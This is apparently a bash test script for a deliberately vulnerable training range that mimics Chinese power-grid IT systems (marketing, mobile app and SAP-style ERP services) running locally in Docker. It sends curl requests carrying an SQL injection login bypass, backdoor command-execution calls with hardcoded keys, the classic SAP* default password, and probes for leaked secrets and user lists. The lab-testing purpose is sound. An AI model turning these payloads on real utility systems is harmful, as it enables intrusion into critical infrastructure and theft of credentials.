#!/bin/bash

# 快速测试脚本 - 直接启动单个服务进行测试

echo "🔍 电力IT系统安全靶场快速测试"
echo "=================================="

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# 测试营销系统
test_marketing() {
    echo -e "\n${YELLOW}🏭 测试电力营销系统 2.0${NC}"
    echo "=================================="
    
    # 启动营销系统
    echo -e "${BLUE}启动营销系统...${NC}"
    docker-compose up -d marketing-gateway marketing-db marketing-cache
    
    # 等待服务启动
    echo -e "${BLUE}等待服务启动...${NC}"
    sleep 30
    
    # 测试SQL注入
    echo -e "\n${BLUE}1. 测试SQL注入漏洞${NC}"
    response=$(curl -s -X POST http://localhost:8080/api/auth/login \
        -H "Content-Type: application/json" \
        -d '{"username": "admin'\'' OR 1=1--", "password": "anything"}' 2>/dev/null)
    
    if echo "$response" | grep -q "success"; then
        echo -e "${GREEN}✅ SQL注入漏洞确认 - 可以绕过登录认证${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ SQL注入测试失败${NC}"
        echo "响应: $response"
    fi
    
    # 测试信息泄露
    echo -e "\n${BLUE}2. 测试信息泄露漏洞${NC}"
    response=$(curl -s http://localhost:8080/api/system/info 2>/dev/null)
    
    if echo "$response" | grep -q "JWT_SECRET\|env"; then
        echo -e "${GREEN}✅ 信息泄露漏洞确认 - 系统配置完全暴露${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ 信息泄露测试失败${NC}"
        echo "响应: $response"
    fi
    
    # 测试命令执行
    echo -e "\n${BLUE}3. 测试命令执行漏洞${NC}"
    response=$(curl -s -X POST http://localhost:8080/api/admin/backdoor \
        -H "Content-Type: application/json" \
        -d '{"key": "admin_backdoor_2024", "command": "whoami"}' 2>/dev/null)
    
    if echo "$response" | grep -q "success\|output"; then
        echo -e "${GREEN}✅ 命令执行漏洞确认 - 可以执行系统命令${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ 命令执行测试失败${NC}"
        echo "响应: $response"
    fi
}

# 测试i国网系统
test_iguowang() {
    echo -e "\n${YELLOW}📱 测试i国网APP系统${NC}"
    echo "=================================="
    
    # 启动i国网系统
    echo -e "${BLUE}启动i国网系统...${NC}"
    docker-compose up -d iguowang-api iguowang-db
    
    # 等待服务启动
    echo -e "${BLUE}等待服务启动...${NC}"
    sleep 30
    
    # 测试短信验证码泄露
    echo -e "\n${BLUE}1. 测试短信验证码泄露漏洞${NC}"
    response=$(curl -s -X POST http://localhost:9080/api/auth/send-sms \
        -H "Content-Type: application/json" \
        -d '{"phone": "13800138000"}' 2>/dev/null)
    
    if echo "$response" | grep -q "debug_code"; then
        echo -e "${GREEN}✅ 短信验证码泄露漏洞确认 - 验证码在响应中暴露${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ 短信验证码测试失败${NC}"
        echo "响应: $response"
    fi
    
    # 测试系统配置泄露
    echo -e "\n${BLUE}2. 测试系统配置泄露漏洞${NC}"
    response=$(curl -s http://localhost:9080/api/system/config 2>/dev/null)
    
    if echo "$response" | grep -q "jwt_secret\|sms_api_key"; then
        echo -e "${GREEN}✅ 系统配置泄露漏洞确认 - 敏感配置完全暴露${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ 系统配置泄露测试失败${NC}"
        echo "响应: $response"
    fi
    
    # 测试用户列表泄露
    echo -e "\n${BLUE}3. 测试用户列表泄露漏洞${NC}"
    response=$(curl -s http://localhost:9080/api/user/list 2>/dev/null)
    
    if echo "$response" | grep -q "users.*phone"; then
        echo -e "${GREEN}✅ 用户列表泄露漏洞确认 - 可以获取所有用户信息${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ 用户列表泄露测试失败${NC}"
        echo "响应: $response"
    fi
}

# 测试ERP系统
test_erp() {
    echo -e "\n${YELLOW}🏢 测试ERP系统${NC}"
    echo "=================================="
    
    # 启动ERP系统
    echo -e "${BLUE}启动ERP系统...${NC}"
    docker-compose up -d erp-app-server erp-db
    
    # 等待服务启动
    echo -e "${BLUE}等待服务启动...${NC}"
    sleep 30
    
    # 测试默认密码
    echo -e "\n${BLUE}1. 测试默认密码漏洞${NC}"
    response=$(curl -s -X POST http://localhost:8000/api/auth/login \
        -d "username=SAP*&password=06071992&client=000" 2>/dev/null)
    
    if echo "$response" | grep -q "success.*true"; then
        echo -e "${GREEN}✅ 默认密码漏洞确认 - SAP经典后门账户可用${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ 默认密码测试失败${NC}"
        echo "响应: $response"
    fi
    
    # 测试系统配置泄露
    echo -e "\n${BLUE}2. 测试系统配置泄露漏洞${NC}"
    response=$(curl -s http://localhost:8000/api/system/config 2>/dev/null)
    
    if echo "$response" | grep -q "database_password\|admin_password"; then
        echo -e "${GREEN}✅ 系统配置泄露漏洞确认 - 所有敏感配置暴露${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ 系统配置泄露测试失败${NC}"
        echo "响应: $response"
    fi
    
    # 测试命令执行
    echo -e "\n${BLUE}3. 测试命令执行漏洞${NC}"
    response=$(curl -s -X POST http://localhost:8000/api/admin/execute \
        -d "admin_key=SAP_ADMIN_2024&command=id" 2>/dev/null)
    
    if echo "$response" | grep -q "success.*true\|output"; then
        echo -e "${GREEN}✅ 命令执行漏洞确认 - 可以执行任意系统命令${NC}"
        echo "响应: $response"
    else
        echo -e "${RED}❌ 命令执行测试失败${NC}"
        echo "响应: $response"
    fi
}

# 主菜单
show_menu() {
    echo ""
    echo -e "${YELLOW}请选择要测试的系统:${NC}"
    echo "1) 🏭 电力营销系统 2.0"
    echo "2) 📱 i国网APP 系统"
    echo "3) 🏢 ERP系统 (SAP风格)"
    echo "4) 🚀 测试所有系统"
    echo "5) 🛑 停止所有服务"
    echo "0) 退出"
    echo ""
}

# 停止所有服务
stop_all() {
    echo -e "${BLUE}🛑 停止所有服务...${NC}"
    docker-compose down
    echo -e "${GREEN}✅ 所有服务已停止${NC}"
}

# 主程序
main() {
    while true; do
        show_menu
        read -p "请输入选择 [0-5]: " choice
        
        case $choice in
            1)
                test_marketing
                ;;
            2)
                test_iguowang
                ;;
            3)
                test_erp
                ;;
            4)
                test_marketing
                test_iguowang
                test_erp
                ;;
            5)
                stop_all
                ;;
            0)
                echo -e "${GREEN}👋 再见!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ 无效选择，请重新输入${NC}"
                ;;
        esac
        
        echo ""
        read -p "按回车键继续..."
    done
}

# 运行主程序
main "$@"
